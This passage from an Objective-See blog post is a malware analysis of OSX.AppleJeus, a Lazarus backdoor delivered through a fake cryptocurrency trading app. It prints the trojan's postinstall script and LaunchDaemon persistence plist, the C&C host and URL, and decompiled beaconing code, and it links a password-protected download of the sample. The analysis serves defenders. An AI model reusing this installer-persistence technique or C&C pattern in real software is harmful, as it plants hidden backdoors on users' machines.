<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">
  <head>
    <meta charset="UTF-8">
    
    <title>Objective-See's Blog</title>
    
    <link rel="shortcut icon" href="../images/logoApple.ico">
    
    <link href="../css/style.css" rel="stylesheet" />
    <script src="../js/analytics.js"></script>
    <script src="../js/sweetalert.min.js"></script>
    <script src="../js/donationPopup.js"></script>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    
    <script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/signup-forms/popup/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>
    <script type="text/javascript">require(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us13.list-manage.com","uuid":"ecee7516f567e712084cdb1d0","lid":"5fae6de946"}) })</script>
    
    
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@objective_see" />
<meta name="twitter:image" content=https://objective-see.com/images/blog/blog_0x49/pkgContents.png />
<meta name="twitter:title" content=Pass&#32;the&#32;AppleJeus />
<meta name="twitter:description" content=a&#32;mac&#32;backdoor&#32;written&#32;by&#32;the&#32;infamous&#32;lazarus&#32;apt&#32;group />
    
<meta property="og:type" content="article" />
<meta property="og:title" content=Pass&#32;the&#32;AppleJeus />
<meta property="og:image" content=https://objective-see.com/images/blog/blog_0x49/pkgContents.png />

    </head>
    <body>

    <link rel="stylesheet" type="text/css" href="/css/menu.css">

<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />

<nav role="main" style="padding-bottom:30px;">
<ul>
    
    <li>
    <div class="logo">
        <a href="/index.html">
            <figure class="logo">
                <img src="/images/logoApple.png" style="height:75px; width:75px;" />
                <br>
                <figcaption class="logo">
                    <span style="color: #95c02d;">Objective</span><span style="color: #798992;">-See</span>
                 
                    <div style="color: #798992; font-size: 18px; font-weight: 300; padding-left: 3px; margin-top: -2px;">
                     a non-profit 501(c)(3) foundation.
                    </div>
                
                </figcaption>
            </figure>
        </a>
    </div>
    </li>

    
    <li>  
        <div class="menuicon">
        <div style="position: relative; min-width:0px;">
        <input type="checkbox" class="toggler">
        <div class="hamburger"><div></div></div>
        <div class="menu">
        <div style="padding-right: 20px;">
            <ul>

                <li>
                    <a href="/news.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/newsIcon.png" height="24px;">
                        <span style="vertical-align:middle">News</span>
                    </a>
                </li>

                <li>
                    <a href="https://objective-see.myshopify.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/storeIcon.png" height="24px;">
                        <span style="vertical-align:middle">Swag</span>
                    </a>
                </li>

                <li>
                    <a href="https://taomm.org/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/bookIcon.png" height="24px;">
                        <span style="vertical-align:middle">Books</span>
                    </a>
                </li>

                <li>
                    <a href="https://objectivebythesea.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/conferenceIcon.png" height="24px;">
                        <span style="vertical-align:middle">Conference</span>
                    </a>
                </li>

                 <li>
                    <a href="/malware.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/malwareIcon.png" height="24px;">
                        <span style="vertical-align:middle">Malware Collection</span>
                    </a>
                </li>

                <li style="border-bottom: none;">
                    <a href="/about.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/aboutIcon.png" height="24px;">
                        <span style="vertical-align:middle">About Objective-See</span>
                    </a>
                </li>

            </ul>
        </div>
    </div>
    </div>
    </div>

    </li>

    
    <li>
        <form action="/support.html" style="display: inline;">
            <button class="menuicon button-4" role="button">Support Us!</button>
        </form>
    </li>

    
    <li>
        <a href="/blog.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/blogIcon.png" class="item"/>
                <figcaption class="item">blog</figcaption>
            </center>
        </figure>
        </a>
    </li>
    
    
    <li>
        <a href="/products.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/productsIcon.png" class="item"/>
            </center>
            <figcaption class="item">tools</figcaption>
        </figure>
        </a>
    </li>

</ul>

<hr class="gradient">

</nav>
    
    <div class="pageContent">
      <br>
      
<section class="blogContent" style="padding-bottom:50px";>
  <div class="blogTitle">Pass the AppleJeus</div>
  <div class="blogSubTitle">a mac backdoor written by the infamous lazarus apt group</div>
  <div class="blogDate" style="padding-top:10px;">by: Patrick Wardle / October 12, 2019</div>
  <div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 15px;">
    <span class="n3rdFont">
    Our research, tools, and writing, are supported by "Friends of Objective-See"
    <br>
    Today&rsquo;s blog post is brought to you by:
    <br>
    <center>
      <a href="https://macpaw.com/cleanmymac" style="text-decoration: none;">
      <img src="../images/friends/cleanmymac.png" width="100px;" style="display:block;  margin:auto; padding-top: 10px;"/>
      CleanMy Mac X
      </a>
    </center>
    <table border="0" style="width:100%; border: none">
    <tr style="width:100%;">
    <td style="padding: 0px; border: none" border="0" align="center">
      <a href="https://malwarebytes.com/" style="text-decoration: none;">
      <img src="../images/friends/malwarebytes.png" width="100px;" style="display:block;  margin:auto; padding-top: 0px;"/>
      Malwarebytes
      </a>
    </td>
    <td style="padding: 0px; border: none" border="0" align="center">
      <a href="https://www.airoav.com/" style="text-decoration: none;">
      <img src="../images/friends/airo.png" width="100px;" style="display:block;  margin:auto; padding-top: 0px;"/>
      Airo AV
      </a>
    </td>
    </tr>
    </table>
    <br>
    <div align="right" style="padding-right:10px; padding-bottom:10px;">
        <a href="https://objective-see.com/friends.html" class="inlineLink">Become a Friend!</a>
    </div>
  </span>
</div>
\
\
<div class="note">
&#x1F4DD; &#x1F47E; Want to play along?
<p>I’ve shared the <a href="https://objective-see.com/downloads/malware/AppleJeus.zip">OSX.AppleJeus sample</a> (password: infect3d)</p>
<p>&hellip;please don’t infect yourself!</p>
</div>
<h3 id="background">Background</h3>
<p>On Friday <a href="https://twitter.com/malwrhunterteam/">@malwrhunterteam</a> tweeted about some interesting malware:</p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">So, in short: anyone installed this &quot;JMT Trader&quot; recently (or anytime? - others will probably have the time to dig and find out...), got some APT&#39;s malware with it too... <a href="https://t.co/tEYJZEYxAq">pic.twitter.com/tEYJZEYxAq</a></p>&mdash; MalwareHunterTeam (@malwrhunterteam) <a href="https://twitter.com/malwrhunterteam/status/1182625004191731712?ref_src=twsrc%5Etfw">October 11, 2019</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<p>At the time of said tweet, the sample was <a href="https://www.virustotal.com/gui/file/e352d6ea4da596abfdf51f617584611fc9321d5a6d1c22aff243aecdef8e7e55/detection">undetected</a> by 0 engines on VirusTotal:</p>
<img src="../images/blog/blog_0x49/vt.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>In the same twitter thread, <a href="https://twitter.com/malwrhunterteam/">@malwrhunterteam</a> also noted this malware may have been seen before (or at least was closely related to previous specimen analyzed by Kaspersky (as <code>OSX.AppleJeus</code>)):</p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">If that highlighted not says anything to you... then look here in what malware it was seen before: <a href="https://t.co/xSfDulILh0">https://t.co/xSfDulILh0</a><br>cc <a href="https://twitter.com/craiu?ref_src=twsrc%5Etfw">@craiu</a> <a href="https://t.co/g2CyU87aLr">pic.twitter.com/g2CyU87aLr</a></p>&mdash; MalwareHunterTeam (@malwrhunterteam) <a href="https://twitter.com/malwrhunterteam/status/1182607363158822912?ref_src=twsrc%5Etfw">October 11, 2019</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<div class="note"> 
<p>Read Kaspersky&rsquo;s excellent write up on a previous (albeit closely related) malware specimen: &ldquo;<a href="https://securelist.com/operation-applejeus/87553/">Operation AppleJeus: Lazarus hits cryptocurrency exchange with fake installer and macOS malware</a>&rdquo;</p>
<p>As we&rsquo;ll see, though related to the previously analyzed specimen, the sample we&rsquo;re looking at today, is also rather unique!</p>
</div> 
<h3 id="more-applejeus">More AppleJeus</h3>
<p>In Kaspersky&rsquo;s original <a href="https://securelist.com/operation-applejeus/87553/">writeup</a>, they detailed an interesting attack whereas the Lazarus APT group targeted various cryptocurrency exchanges &ldquo;with a fake installer and macOS malware&rdquo;. One of the more interesting aspects of this operation, is that the APT group actually fabricated an entire fake company (&ldquo;Celas Trade Pro&rdquo;) and website in order to increase the realism of the attack.</p>
<blockquote>
"The victim had been infected with the help of a trojanized cryptocurrency trading application, which had been recommended to the company over email. It turned out that an unsuspecting employee of the company had willingly downloaded a third-party application from a legitimate looking website"
</blockquote>
<p>As part of my recent RSA <a href="https://www.rsaconference.com/industry-topics/presentation/whats-your-game-plan-leveraging-apples-game-engine-to-detect-threats">presentation</a> I highlighted this attack as well:
<img src="../images/blog/blog_0x49/rsa.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>
</p>
<p>The sample we&rsquo;re looking at today, appears to follow an identical approach to infect macOS targets. First, a &ldquo;new&rdquo; company was created: &ldquo;JMT Trading&rdquo; (hosted at: <a href="https://www.jmttrading.org/">https://www.jmttrading.org/</a>):
<img src="../images/blog/blog_0x49/website.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>
</p>
<p>Looks reasonably legitimate, ya? Following the &ldquo;Download from Github&rdquo; link, takes us to: <a href="https://github.com/jmttrading/JMTTrader/releases">https://github.com/jmttrading/JMTTrader/releases</a>, which contains various files for download. Files that contain malware! 👾</p>
<div class="note"> 
As noted in another recent [tweet](https://twitter.com/malwrhunterteam/status/1182740228550942721), the attackers appeared to have already updated the hosted files, replacing the malicious ones with pristine versions. 
<p>I’ve shared the <a href="https://objective-see.com/downloads/malware/AppleJeus.zip">infected macOS disk image</a> containing the AppleJeus malware (password: infect3d).</p>
</div> 
<p>Here we&rsquo;ll comprehensively examine the <code>JMTTrader_Mac.dmg</code> disk image (sha1: <code>74390fba9445188f2489959cb289e73c6fbe58e4</code>):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ shasum -a 1 ~/Downloads/JMTTrader_Mac.dmg 
74390fba9445188f2489959cb289e73c6fbe58e4  ~/Downloads/JMTTrader_Mac.dmg
</pre>
</div>
<p>Mounting the disk image reveals a single file: <code>JMTTrader.pkg</code></p>
<p><div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

$ hdiutil attach JMTTrader_Mac.dmg
expected   CRC32 $500E981E
...
/dev/disk3s1  41504653-0000-11AA-AA11-0030654 /Volumes/JMTTrader

$ ls /Volumes/JMTTrader/
JMTTrader.pkg

</pre>
</div>
<br>
<br>
<img src="../images/blog/blog_0x49/pkg.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>
</p>
<p>My favorite tools for statically analyzing <code>.pkg</code> files is an application, aptly named, <code>Suspicious Package</code> (available for download  <a href="https://mothersruin.com/software/SuspiciousPackage/">here</a>).</p>
<p>Via this app, let&rsquo;s take a peek at the <code>JMTTrader.pkg</code>:
<img src="../images/blog/blog_0x49/pkgInfo.png"  width="85%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>
</p>
<p>As can be seen, the package is not signed and contains a <code>postinstall</code> script (which contains the actual installation instructions). Using the <code>Suspicious Package</code> app, we can view the contents of this install file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#75715e">#!/bin/sh
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#75715e"></span>mv /Applications/JMTTrader.app/Contents/Resources/.org.jmttrading.plist 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>   /Library/LaunchDaemons/org.jmttrading.plist
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>chmod <span style="color:#ae81ff">644</span> /Library/LaunchDaemons/org.jmttrading.plist
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>mkdir /Library/JMTTrader
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>mv /Applications/JMTTrader.app/Contents/Resources/.CrashReporter 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>   /Library/JMTTrader/CrashReporter
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>chmod +x /Library/JMTTrader/CrashReporter
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>/Library/JMTTrader/CrashReporter Maintain &amp;</span></span></code></pre></div>
<p>In short, this install script:</p>
<ol>
<li>Installs a launch daemon plist (<code>org.jmttrading.plist</code>)</li>
<li>Installs a daemon (<code>CrashReporter</code>)</li>
<li>Executes said daemon with the <code>Maintain</code> command line parameter.</li>
</ol>
<p>Note that this requires administrative privileges, but the malware will kindly ask for such privileges during installation:</p>
<img src="../images/blog/blog_0x49/install.png"  width="66%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>Both the daemon&rsquo;s plist and binary are (originally) embedded into an application, <code>JMTTrader.app</code> found within the <code>.pkg</code>. Specifically they&rsquo;re hidden files found in the <code>/Resources</code> directory; <code>Resources/.org.jmttrading.plist </code> and <code>Resources/.CrashReporter</code>:</p>
<img src="../images/blog/blog_0x49/pkgContents.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>Using the &ldquo;Suspicious Package&rdquo; app we can extract both these file for analysis.</p>
<p>First, let&rsquo;s look at the launch daemon plist (<code>org.jmttrading.plist</code>):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;
&lt;plist version=&quot;1.0&quot;&gt;
&lt;dict&gt;
        &lt;key&gt;Label&lt;/key&gt;
        &lt;string&gt;org.jmttrading.jmttrader&lt;/string&gt;
        &lt;key&gt;ProgramArguments&lt;/key&gt;
        &lt;array&gt;
                &lt;string&gt;/Library/JMTTrader/CrashReporter&lt;/string&gt;
                &lt;string&gt;Maintain&lt;/string&gt;
        &lt;/array&gt;
        &lt;key&gt;RunAtLoad&lt;/key&gt;
        &lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;

</pre>
</div>
<p>As expected, it references the daemon <code>/Library/JMTTrader/CrashReporter</code> (in the <code>ProgramArguments</code> array). As the <code>RunAtLoad</code> is set to <code>true</code> macOS will automatically (re)start the daemon every time the system is rebooted.</p>
<p>Now on to the <code>CrashReporter</code> binary.</p>
<p>Via the <code>file</code> command, we can determine its file type (Mach-O 64-bit):
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ file ~/Downloads/.CrashReporter 
~/Downloads/.CrashReporter: Mach-O 64-bit executable x86_64
</pre>
</div></p>
<p>Using my <a href="https://objective-see.com/products/whatsyoursign.html">WhatsYourSign</a> utility, we can easily ascertain it&rsquo;s code-signing status. Though signed, it&rsquo;s signed ad-hoc:</p>
<img src="../images/blog/blog_0x49/signed.png"  width="75%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>Running the <code>strings</code> command, affords us valuable insight into the (likely) functionality of the binary.</p>
<p><div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ strings -a ~/Downloads/.CrashReporter 

Content-Disposition: form-data; name="%s"; 
jGzAcN6k4VsTRn9
...
mont.jpg
...
beastgoc.com
https://%s/grepmonux.php
POST
...
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36

X,%`PMk--Jj8s+6=

</pre>
</div>
<br>
\</p>
<div class="note">
<p>Always run the <code>strings</code> command with the <code>-a</code> flag to instruct it to scan the entire file for printable strings!</p>
</div>
<p>From the output of the strings command, we can see some interesting, well, strings!</p>
<ul>
<li>
<p><code>beastgoc.com</code>, <code>https://%s/grepmonux.php</code><br>
likely a download or C&amp;C server?</p>
</li>
<li>
<p><code>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...</code><br>
the binary&rsquo;s user-agent (perhaps useful as an IOC)?</p>
</li>
<li>
<p><code>X,%\`PMk--Jj8s+6=</code><br>
perhaps an encryption or decryption key?</p>
</li>
</ul>
<h3 id="detailed-analysis">Detailed Analysis</h3>
<p>Now, it&rsquo;s time to dive in and tear apart the <code>CrashReporter</code> binary! Let&rsquo;s pop over to a virtual machine and start a detailed analysis.</p>
<p>The binary&rsquo;s <code>main</code> function is actual rather simple, and due to named functions, rather informative:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">_main</span>(<span style="color:#66d9ef">int</span> arg0, <span style="color:#66d9ef">int</span> arg1, <span style="color:#66d9ef">int</span> arg2, <span style="color:#66d9ef">int</span> arg3) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    <span style="color:#66d9ef">if</span> ((arg0 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">||</span> (strcmp(arg1, <span style="color:#e6db74">&#34;Maintain&#34;</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>)) <span style="color:#66d9ef">goto</span> exit;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    make_token();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    chdir(<span style="color:#e6db74">&#34;/&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>   
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    loop:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>        rcx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>        <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>                <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>                        rbx <span style="color:#f92672">=</span> rcx;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>                        <span style="color:#66d9ef">while</span> (conn_to_base() <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>                                sleep(<span style="color:#ae81ff">0x5</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>                        }
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>                        usleep(<span style="color:#ae81ff">0x186a0</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>                        rax <span style="color:#f92672">=</span> listen_message();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>                        rcx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>                } <span style="color:#66d9ef">while</span> (rax <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>                rcx <span style="color:#f92672">=</span> rbx <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>        } <span style="color:#66d9ef">while</span> (rbx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x3</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>        sleep(<span style="color:#ae81ff">0x384</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>        <span style="color:#66d9ef">goto</span> loop;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>    exit:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>}</span></span></code></pre></div>
<p>From the above decompilation, we can ascertain the following:</p>
<ol>
<li>
<p>The malware expects to be executed with a single commandline argument: <code>Maintain</code> <br>
(Recall that when the malware was persisted, this argument is passed in via the launch daemon plist).</p>
</li>
<li>
<p>After generating a (random) token, the malware enters a loop.</p>
</li>
<li>
<p>The loop invokes a function named <code>conn_to_base</code>.</p>
</li>
<li>
<p>If the <code>conn_to_base</code> function succeeds, it invokes a function named <code>listen_message</code>.</p>
</li>
</ol>
<p>We can start the malware in a debugger (<code>lldb</code>), making sure to set the required argument:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ lldb ./CrashReporter 
(lldb) target create "./CrashReporter"
Current executable set to './CrashReporter' (x86_64).

(lldb) settings set target.run-args Maintain
</pre>
</div>
<p>First, we&rsquo;ll set a breakpoint on the <code>conn_to_base</code> function (address: <code>0x0000000100001fd7</code>).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">conn_to_base</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    r15 <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0x30000</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    r14 <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0x30000</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    __bzero(r15, <span style="color:#ae81ff">0x30000</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    __bzero(r14, <span style="color:#ae81ff">0x30000</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    r15 <span style="color:#f92672">=</span> g_token;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    (r15 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4</span>) <span style="color:#f92672">=</span> _g_version;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    (r15 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">=</span> getpid();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    var_1C <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>    rax <span style="color:#f92672">=</span> send_to_base(rdi, r15, <span style="color:#ae81ff">0xc</span>, r14, <span style="color:#f92672">&amp;</span>var_1C, <span style="color:#ae81ff">0x0</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>    rbx <span style="color:#f92672">=</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) {
